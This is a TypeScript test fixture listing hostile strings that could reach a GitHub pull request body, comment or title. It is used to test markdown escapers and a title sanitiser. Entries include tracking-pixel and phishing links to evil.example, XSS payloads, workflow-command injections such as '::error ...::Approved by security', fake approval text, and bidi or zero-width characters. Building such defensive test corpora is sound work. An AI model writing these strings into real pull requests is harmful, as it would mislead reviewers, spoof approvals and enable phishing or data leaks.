/**
 * Text an agent read or a model wrote, as it could reach a pull request's body, the Action's comment
 * or a job summary: each shows something GitHub renders, links, mentions or cross-references, or hides
 * or reorders what is shown. markdown.test.ts and the Action's tests hold both escapers to them.
 */
export const HOSTILE = [
  '![pixel](https://evil.example/t.png?d=secret)', '[click here](https://evil.example/login)', '[x][1]\n\n[1]: https://evil.example', 'see [^1]\n\n[^1]: https://evil.example',
  '<https://evil.example>', 'https://evil.example/phish', 'www.evil.example', 'HTTPS://EVIL.EXAMPLE', 'WWW.EVIL.EXAMPLE/x', 'ftp://evil.example/x', 'mailto:a@evil.example',
  'mail me at admin@evil.example', '@alice please approve', 'cc @northwind/security-team', '((@zed))', '@a@b', '[@yan](https://evil.example)', 'x@bob is not one, but @carol is',
  'fixes #1', 'closes northwind/agent#2', 'see GH-3', '#4 at the start', '(#7)', '[#8]', '&#64;dave via an entity', '&#x40;hex', '&commat;named', '#&#49;2', '&#91;x&#93;(https://evil.example)',
  '`code` then @erin', '``` fence', '`@inside code`', 'a \\[b\\](https://evil.example)', '\\@frank', '\\\\![x](y)', 'trailing \\',
  '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', '<!-- hidden --> shown', '<!-->', '<![CDATA[x]]>', '<?php system(1); ?>', '<details><summary>a</summary>b', '</summary><img src=x>', '<a href="https://evil.example">x</a>', '&lt;img src=x&gt;',
  '$\\color{red}\\text{Approved}$', '$$x$$', '**bold** _it_ ~~strike~~ :smile:', '***', '___', 'pipe | in | cell', '| a | b |', '\\| escaped pipe',
  '# heading', '> quote', '- item', '+++', '1. item', '2) item', '---', '=== under', '- [ ] task',
  'line\nbreak\r\nand\u2028sep', 'bidi \u202eevil\u202c here', 'zero\u200bwidth @gr\u200bace', 'tab\there', 'nul\u0000byte',
  'a&b <= c >= d', '<=5% risk, up to 80 attempts', 'issue_refund called 0 times, but called 1 time', 'model call #5 (3 of 5)', '{"to":"oncall@example.com","amount":240}', 'C:\\path\\to\\file',
  'costs $5 and $10 today', 'a $x$ b', '$`x`$', 'x\\$y$z$', '$$\\huge\\color{red}\\text{Approved}$$', ':smile: :+1:', 'org/repo@abc1234', 'cli/cli#1', 'git@github.com:x/y', '[^n]', '<details>open',
];

/**
 * Titles a repairer could give its fix, as they could reach a pull request's title, which GitHub
 * shows as written: a mention, a reference, a workflow command's start, a line break, a character
 * that hides or reorders what is shown, word joiners of their own, nothing at all, more than GitHub
 * takes. titleText, the engine's and the Action's, is held to them and to HOSTILE.
 */
export const HOSTILE_TITLES = [
  'Escalate refunds over $500 to @finance-leads, see #12',
  'Ask @northwind/security first, then close northwind/agent#3 and GH-4',
  '::stop-commands::resume\nApprove it',
  '::error file=agent.mjs,line=1::Approved by security',
  '##[error]legacy command, and mid ##[group]title',
  'bidi \u202eevil\u202c and zero\u200bwidth @gr\u200bace',
  'joined @\u2060already, #\u206012 and :\u2060:x',
  '\u200b\u200e\u2060\ufeff',
  '   ',
  'tab\there\r\nand\u2028sep',
  'a'.repeat(300),
  '@x '.repeat(200),
  '#1'.repeat(200),
];
